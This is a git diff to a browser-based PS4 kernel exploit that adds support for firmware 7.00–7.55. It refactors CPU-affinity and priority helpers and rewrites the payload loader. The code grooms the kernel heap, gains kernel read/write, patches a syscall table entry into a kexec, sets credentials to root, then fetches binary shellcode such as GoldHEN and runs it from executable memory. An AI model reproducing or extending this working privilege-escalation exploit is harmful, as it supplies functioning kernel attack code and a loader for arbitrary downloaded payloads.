@@ -38,6 +38,9 @@ import * as rop from "./module/chain.mjs";
 import * as config from "./config.mjs";
 
 // static imports for firmware configurations
+import * as fw_ps4_700 from "./lapse/ps4/700.mjs";
+import * as fw_ps4_750 from "./lapse/ps4/750.mjs";
+import * as fw_ps4_751 from "./lapse/ps4/751.mjs";
 import * as fw_ps4_800 from "./lapse/ps4/800.mjs";
 import * as fw_ps4_850 from "./lapse/ps4/850.mjs";
 import * as fw_ps4_852 from "./lapse/ps4/852.mjs";
@@ -64,7 +67,7 @@ const [is_ps4, version] = (() => {
     throw RangeError(`invalid config.target: ${hex(value)}`);
   }
 
-  log(`Console: PS${is_ps4 ? "4" : "5"} | Firmware: ${hex(version)}`);
+  log(`console: PS${is_ps4 ? "4" : "5"} | firmware: ${hex(version)}`);
 
   return [is_ps4, version];
 })();
@@ -72,7 +75,16 @@ const [is_ps4, version] = (() => {
 // set per-console/per-firmware offsets
 const fw_config = (() => {
   if (is_ps4) {
-    if (0x800 <= version && version < 0x850) {
+    if (0x700 <= version && version < 0x750) {
+      // 7.00, 7.01, 7.02
+      return fw_ps4_700;
+    } else if (0x750 <= version && version < 0x751) {
+      // 7.50
+      return fw_ps4_750;
+    } else if (0x751 <= version && version < 0x800) {
+      // 7.51, 7.55
+      return fw_ps4_751;
+    } else if (0x800 <= version && version < 0x850) {
       // 8.00, 8.01, 8.03
       return fw_ps4_800;
     } else if (0x850 <= version && version < 0x852) {
@@ -94,7 +106,7 @@ const fw_config = (() => {
   } else {
     // TODO: PS5
   }
-  throw new RangeError(`unsupported console/firmware: ps${is_ps4 ? "4" : "5"}, version: ${hex(version)}`);
+  throw new RangeError(`unsupported: console: PS${is_ps4 ? "4" : "5"} | firmware: ${hex(version)}`);
 })();
 
 const pthread_offsets = fw_config.pthread_offsets;
@@ -111,8 +123,8 @@ const AF_INET6 = 28;
 const SOCK_STREAM = 1;
 const SOCK_DGRAM = 2;
 const SOL_SOCKET = 0xffff;
-const SO_REUSEADDR = 4;
-const SO_LINGER = 0x80;
+const SO_REUSEADDR = 0x0004;
+const SO_LINGER = 0x0080;
 
 // netinet/in.h
 const IPPROTO_TCP = 6;
@@ -120,8 +132,8 @@ const IPPROTO_UDP = 17;
 const IPPROTO_IPV6 = 41;
 
 // netinet/tcp.h
-const TCP_INFO = 0x20;
-const size_tcp_info = 0xec;
+const TCP_INFO = 32;
+const sizeof_tcp_info_ = 0xec;
 
 // netinet/tcp_fsm.h
 const TCPS_ESTABLISHED = 4;
@@ -136,17 +148,24 @@ const IPV6_TCLASS = 61;
 // sys/cpuset.h
 const CPU_LEVEL_WHICH = 3;
 const CPU_WHICH_TID = 1;
+const sizeof_cpuset_t_ = 0x10;
 
 // sys/mman.h
-const PROT_READ = 1;
-const PROT_WRITE = 2;
-const PROT_EXEC = 4;
-const MAP_SHARED = 1;
-const MAP_FIXED = 0x10;
+const PROT_READ = 0x01;
+const PROT_WRITE = 0x02;
+const PROT_EXEC = 0x04;
+const MAP_SHARED = 0x0001;
+const MAP_FIXED = 0x0010;
+const MAP_ANON = 0x1000;
+const MAP_PREFAULT_READ = 0x00040000;
 
 // sys/rtprio.h
+const RTP_LOOKUP = 0;
 const RTP_SET = 1;
+// const RTP_PRIO_ITHD = 1;
 const RTP_PRIO_REALTIME = 2;
+// const RTP_PRIO_NORMAL = 3;
+// const RTP_PRIO_IDLE = 4;
 
 // SceAIO has 2 SceFsstAIO workers for each SceAIO Parameter. each Parameter
 // has 3 queue groups: 4 main queues, 4 wait queues, and one unused queue
@@ -178,7 +197,7 @@ const main_core = 7;
 const num_grooms = 0x200;
 const num_handles = 0x100;
 const num_sds = 0x100; // max is 0x100 due to max IPV6_TCLASS
-const num_alias = 10;
+const num_alias = 100;
 const num_races = 100;
 const leak_len = 16;
 const num_leaks = 5;
@@ -382,12 +401,50 @@ function free_aios2(ids_p, num_ids) {
   }
 }
 
-function get_our_affinity(mask) {
-  sysi("cpuset_getaffinity", CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 8, mask.addr);
+function get_cpu_affinity(mask) {
+  sysi("cpuset_getaffinity", CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, sizeof_cpuset_t_, mask.addr);
 }
 
-function set_our_affinity(mask) {
-  sysi("cpuset_setaffinity", CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 8, mask.addr);
+function set_cpu_affinity(mask) {
+  sysi("cpuset_setaffinity", CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, sizeof_cpuset_t_, mask.addr);
+}
+
+function pin_to_core(core) {
+  const mask = new Buffer(sizeof_cpuset_t_);
+  mask.write32(0, 1 << core);
+  set_cpu_affinity(mask);
+}
+
+function get_core_index(mask) {
+  let num = mem.read32(mask.addr);
+  let position = 0;
+  while (num > 0) {
+    num = num >>> 1;
+    position += 1;
+  }
+  return position - 1;
+}
+
+function get_current_core() {
+  const mask = new Buffer(sizeof_cpuset_t_);
+  get_cpu_affinity(mask);
+  return get_core_index(mask);
+}
+
+function get_current_rtprio() {
+  const _rtprio = new Buffer(4);
+  sysi("rtprio_thread", RTP_LOOKUP, 0, _rtprio.addr);
+  return {
+    type: _rtprio.read16(0),
+    prio: _rtprio.read16(2),
+  };
+}
+
+function set_rtprio(rtprio_obj) {
+  const _rtprio = new Buffer(4);
+  _rtprio.write16(0, rtprio_obj.type);
+  _rtprio.write16(2, rtprio_obj.prio);
+  sysi("rtprio_thread", RTP_SET, 0, _rtprio.addr);
 }
 
 function close(fd) {
@@ -607,12 +664,12 @@ function race_one(request_addr, tcp_sd, barrier, racer, sds) {
     aio_multi_poll(request_addr, 1, poll_err.addr);
     log(`poll: ${hex(poll_err[0])}`);
 
-    const info_buf = new View1(size_tcp_info);
+    const info_buf = new View1(sizeof_tcp_info_);
     const info_size = gsockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, info_buf);
     log(`info size: ${hex(info_size)}`);
 
-    if (info_size !== size_tcp_info) {
-      die(`info size isn't ${size_tcp_info}: ${info_size}`);
+    if (info_size !== sizeof_tcp_info_) {
+      die(`info size isn't ${sizeof_tcp_info_}: ${info_size}`);
     }
 
     const tcp_state = info_buf[0];
@@ -1470,15 +1527,6 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
   kmem.write64(w_rthdr_p, 0);
   log("corrupt pointers cleaned");
 
-  /*
-    // REMOVE once restore kernel is ready for production
-    // increase the ref counts to prevent deallocation
-    kmem.write32(main_sock, kmem.read32(main_sock) + 1);
-    kmem.write32(worker_sock, kmem.read32(worker_sock) + 1);
-    // +2 since we have to take into account the fget_write()'s reference
-    kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);
-    */
-
   return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
 }
 
@@ -1487,7 +1535,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
 async function get_binary(url) {
   const response = await fetch(url);
   if (!response.ok) {
-    throw Error(`Network response was not OK, status: ${response.status}\nfailed to fetch: ${url}`);
+    throw Error(`network response was not OK, status: ${response.status}\nfailed to fetch: ${url}`);
   }
   return response.arrayBuffer();
 }
@@ -1499,17 +1547,21 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
   if (!is_ps4) {
     throw RangeError("ps5 kernel patching unsupported");
   }
-  if (!(0x800 <= version && version < 0x1000)) {
-    // 8.00, 8.01, 8.03, 8.50, 8.52, 9.00, 9.03, 9.04, 9.50, 9.51, 9.60
+  if (!(0x700 <= version && version < 0x1000)) {
+    // Only 7.00-9.60 supported
     throw RangeError("kernel patching unsupported");
   }
 
   log("change sys_aio_submit() to sys_kexec()");
   // sysent[661] is unimplemented so free for use
   const sysent_661 = kbase.add(off_sysent_661);
-  const sy_narg = kmem.read32(sysent_661);
-  const sy_call = kmem.read64(sysent_661.add(8));
-  const sy_thrcnt = kmem.read32(sysent_661.add(0x2c));
+  const sysent_661_save = new Buffer(0x30); // sizeof syscall
+  for (let off = 0; off < sysent_661_save.size; off += 8) {
+    sysent_661_save.write64(off, kmem.read64(sysent_661.add(off)));
+  }
+  log(`sysent[611] save addr: ${sysent_661_save.addr}`);
+  log("sysent[611] save data:");
+  hexdump(sysent_661_save);
   // .sy_narg = 6
   kmem.write32(sysent_661, 6);
   // .sy_call = gadgets['jmp qword ptr [rsi]']
@@ -1525,7 +1577,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
   kmem.write64(p_ucred.add(0x68), -1); // 0xffffffffffffffff
 
   const buf = await get_binary(patch_elf_loc);
-  const patches = new View1(await buf);
+  const patches = new View1(buf);
   let map_size = patches.size;
   const max_size = 0x10000000;
   if (map_size > max_size) {
@@ -1542,9 +1594,12 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
   const prot_rwx = 7;
   const exec_p = new Int(0, 9);
   const write_p = new Int(max_size, 9);
+
+  log("open JIT fds");
   const exec_fd = sysi("jitshm_create", 0, map_size, prot_rwx);
   const write_fd = sysi("jitshm_alias", exec_fd, prot_rw);
 
+  log("mmap for kpatch shellcode");
   const exec_addr = chain.sysp("mmap", exec_p, map_size, prot_rx, MAP_SHARED | MAP_FIXED, exec_fd, 0);
   const write_addr = chain.sysp("mmap", write_p, map_size, prot_rw, MAP_SHARED | MAP_FIXED, write_fd, 0);
 
@@ -1571,22 +1626,33 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     die("test jit exec failed");
   }
 
+  log("mlock saved data for kernel restore");
   const pipe_save = restore_info[1];
   restore_info[1] = pipe_save.addr;
-  log("mlock pipe save data for kernel restore");
   sysi("mlock", restore_info[1], page_size);
+  restore_info[4] = sysent_661_save.addr;
+  sysi("mlock", restore_info[4], page_size);
 
+  log("execute kpatch...");
   mem.cpy(write_addr, patches.addr, patches.size);
   sys_void("kexec", exec_addr, ...restore_info);
 
-  log("setuid(0)");
-  sysi("setuid", 0);
-  log("kernel exploit succeeded!");
+  // Explicitly close everything, it should happen implicitly already... did
+  // not fix blackscreen issue.
 
-  kmem.write32(sysent_661.add(0x2c), sy_thrcnt);
-  kmem.write64(sysent_661.add(8), sy_call);
-  kmem.write32(sysent_661, sy_narg);
-  log("restored sys_aio_submit()");
+  // log("munlock locked data");
+  // sysi("munlock", restore_info[4], page_size);
+  // sysi("munlock", restore_info[1], page_size);
+  // sysi("munlock", exec_addr, map_size);
+
+  // log("munmap kpatch shellcode memory");
+  // sysi("munmap", write_addr, map_size);
+  // sysi("munmap", exec_addr, map_size);
+
+  // One works, both cause an OOM error, then works as it reloads because it kpatched properly
+  // log("close JIT fds");
+  // close(write_fd);
+  // close(exec_fd);
 }
 
 // FUNCTIONS FOR STAGE: SETUP
@@ -1637,29 +1703,37 @@ export async function kexploit() {
   // If setuid is successful, we dont need to run the kernel exploit again
   try {
     if (sysi("setuid", 0) == 0) {
-      log("Kernel already patched, skipping kexploit");
+      log("kernel already patched, skipping kexploit");
       return true;
     }
   } catch {
     // Expected when not in an exploited state
   }
 
+  localStorage.removeItem('jbsuccess')
+
+  // Get current core/rtprio
+  const current_core = get_current_core();
+  const current_rtprio = get_current_rtprio();
+  log(`current core: ${current_core}`);
+  log(`current rtprio: type=${current_rtprio.type} prio=${current_rtprio.prio}`);
+
   // fun fact:
   // if the first thing you do since boot is run the web browser, WebKit can
   // use all the cores
-  const main_mask = new Long();
-  get_our_affinity(main_mask);
+  const main_mask = new Buffer(sizeof_cpuset_t_);
+  get_cpu_affinity(main_mask);
   log(`main_mask: ${main_mask}`);
 
   // pin to 1 core so that we only use 1 per-cpu bucket. this will make heap
   // spraying and grooming easier
   log(`pinning process to core #${main_core}`);
-  set_our_affinity(new Long(1 << main_core));
-  get_our_affinity(main_mask);
+  pin_to_core(main_core);
+  get_cpu_affinity(main_mask);
   log(`main_mask: ${main_mask}`);
 
   log("setting main thread's priority");
-  sysi("rtprio_thread", RTP_SET, 0, rtprio.addr);
+  set_rtprio({ type: RTP_PRIO_REALTIME, prio: 0x100 });
 
   const [block_fd, unblock_fd] = (() => {
     const unix_pair = new View4(2);
@@ -1693,7 +1767,9 @@ export async function kexploit() {
     log("\nSTAGE: Patch kernel");
     await patch_kernel(kbase, kmem, p_ucred, restore_info);
   } finally {
-    close(unblock_fd);
+    if (unblock_fd !== undefined && unblock_fd !== null) {
+      close(unblock_fd);
+    }
 
     const t2 = performance.now();
     const ftime = t2 - t1;
@@ -1704,21 +1780,36 @@ export async function kexploit() {
     log(`time to init: ${(_init_t1 - t1) / 1000}`);
     log(`time - init time: ${(ftime - init_time) / 1000}`);
   }
-  close(block_fd);
-  free_aios2(groom_ids.addr, groom_ids.length);
-  aio_multi_wait(block_id.addr, 1);
-  aio_multi_delete(block_id.addr, block_id.length);
+  if (block_fd !== undefined && block_fd !== null) {
+    close(block_fd);
+  }
+  if (groom_ids) {
+    free_aios2(groom_ids.addr, groom_ids.length);
+  }
+  if (block_id !== null) {
+    aio_multi_wait(block_id.addr, 1);
+    aio_multi_delete(block_id.addr, block_id.length);
+  }
   for (const sd of sds) {
     close(sd);
   }
 
+  // Restore core/rtprio
+  log(`restoring core: ${current_core}`);
+  log(`restoring rtprio: type=${current_rtprio.type} prio=${current_rtprio.prio}`);
+  pin_to_core(current_core);
+  set_rtprio(current_rtprio);
+
   // Check if it all worked
+  log("setuid(0)");
   try {
     if (sysi("setuid", 0) == 0) {
+      log("kernel exploit succeeded!");
       return true;
     }
   } catch {
     // Still not exploited, something failed, but it made it here...
+    die("kernel exploit failed!");
   }
 
   return false;
@@ -1743,8 +1834,19 @@ function malloc32(sz) {
 }
 
 // ChendoChap's from pOOBs4
+function array_from_address(addr, size) {
+  const og_array = new Uint32Array(0x1000);
+  const og_array_i = mem.addrof(og_array).add(0x10);
+  mem.write64(og_array_i, addr);
+  mem.write32(og_array_i.add(0x8), size);
+  mem.write32(og_array_i.add(0xc), 1);
+  nogc.push(og_array);
+  return og_array;
+}
+
+// ChendoChap's from pOOBs4
 function runBinLoader() {
-  const payload_buffer = chain.sysp("mmap", 0x0, 0x300000, 0x7, 0x1000, 0xffffffff, 0);
+  const payload_buffer = chain.sysp("mmap", 0, 0x300000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON, -1, 0);
   const payload_loader = malloc32(0x1000);
   const loader_writer = payload_loader.backing;
   loader_writer[0] = 0x56415741;
@@ -1814,43 +1916,44 @@ function runBinLoader() {
 
   {
     sysi("mlock", payload_buffer, 0x300000);
-    call_nze("pthread_create", pthread, 0x0, payload_loader, payload_buffer);
+    call_nze("pthread_create", pthread, 0, payload_loader, payload_buffer);
   }
 
-  log("Awaiting payload...");
+  log("awaiting payload...");
 }
 
 function runPayload(path) {
   log(`loading ${path}`);
   const xhr = new XMLHttpRequest();
-  xhr.open("GET", path);
+  xhr.open("GET", path, true); 
   xhr.responseType = "arraybuffer";
-  xhr.onreadystatechange = function () {
-    if (xhr.readyState === 4) {
-      if (xhr.status === 200) {
-        try {
-          const payload_buffer = chain.sysp("mmap", 0x0, 0x300000, 0x7, 0x41000, 0xffffffff, 0);
-          log(`payload buffer allocated at ${payload_buffer}`);
-
-          // Trick for 4 bytes padding
-          const padding = new Uint8Array(4 - ((xhr.response.byteLength % 4) % 4));
-          const tmp = new Uint8Array(xhr.response.byteLength + padding.byteLength);
-          tmp.set(new Uint8Array(xhr.response), 0);
-          tmp.set(padding, xhr.response.byteLength);
-
-          const shellcode = new Uint32Array(tmp.buffer);
-          for (let i = 0; i < shellcode.length; i++) {
-            mem.write32(payload_buffer.add(0x100000 + i * 4), shellcode[i]);
-          }
-          log(`loaded ${xhr.response.byteLength} bytes for payload (+ ${padding.length} bytes padding)`);
-          chain.call_void(payload_buffer);
-          sysi("munmap", payload_buffer, 0x300000);
-        } catch (e) {
-          log(`error in runPayload: ${e.message}`);
+  xhr.onload = function () {
+    if (xhr.status === 200) {
+      try {
+        const response = new Uint8Array(xhr.response);
+        const paddingLength = (4 - (response.byteLength % 4)) % 4;
+        const paddedBuffer = new Uint8Array(response.byteLength + paddingLength);
+        paddedBuffer.set(response, 0);
+        if (paddingLength) {
+          paddedBuffer.set(new Uint8Array(paddingLength), response.byteLength);
         }
-      } else {
-        log(`error retrieving payload, ${xhr.status}`);
+        const shellcode = new Uint32Array(paddedBuffer.buffer);
+        const payloadBuffer = chain.sysp("mmap", 0, paddedBuffer.length, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PREFAULT_READ, -1, 0);
+        log(`payload buffer allocated at ${payloadBuffer}`);
+        const payloadBufferShadow = array_from_address(payloadBuffer, shellcode.length);
+        payloadBufferShadow.set(shellcode);
+        log(`loaded ${response.byteLength} bytes for payload (+ ${paddingLength} bytes padding)`);
+        try {
+          chain.call_void(payloadBuffer);
+        } catch (e) {
+          log(`error executing payload: ${e.message}`);
+        }
+        sysi("munmap", payloadBuffer, paddedBuffer.length);
+      } catch (e) {
+        log(`error in runPayload: ${e.message}`);
       }
+    } else {
+      log(`error retrieving payload, ${xhr.status}`);
     }
   };
   xhr.onerror = function () {
@@ -1864,7 +1967,44 @@ kexploit().then((success) => {
     if (sessionStorage.getItem('binloader')){
       runBinLoader();
     } else {
-      runPayload(window.payload_path);
+      LoadPayload();
     }
   }
 });
+
+function LoadPayload(){
+  log("The payload is going to be loaded now. Please wait...")
+  document.getElementById('loader').style.display = 'flex';
+  if (localStorage.getItem('jbsuccess') && (window.payload_path == "./payloads/GoldHEN/GoldHEN.bin" || window.payload_path == "./payloads/HEN/HEN.bin")) {
+    log("Already jailbroken !");
+    if(document.getElementById('ckbaj').checked){
+      const Confirmation = confirm("It seems you are already jailbroken.\nDo you want to run the payload again?");
+      if (Confirmation) {
+        setTimeout(() => {
+          runPayload(window.payload_path)
+          localStorage.setItem('jbsuccess', 1);
+        }, 2000);
+      } else {
+        log("Payload run cancelled.");
+      }
+    } else {
+      setTimeout(() => {
+        runPayload(window.payload_path)
+        localStorage.setItem('jbsuccess', 1);
+      }, 2000);
+    }
+  } else {
+    setTimeout(() => {
+      runPayload(window.payload_path)
+      localStorage.setItem('jbsuccess', 1);
+    }, 2000);
+  }
+  setTimeout(() => {
+    sessionStorage.setItem('jbsuccess', 1);
+    if (document.getElementById('loader').style.display == 'flex'){
+      document.getElementById('jailbreak').style.display = 'flex';
+      document.getElementById('loader').style.display = 'none';
+    }
+    window.location.reload();
+  }, 5000);
+}
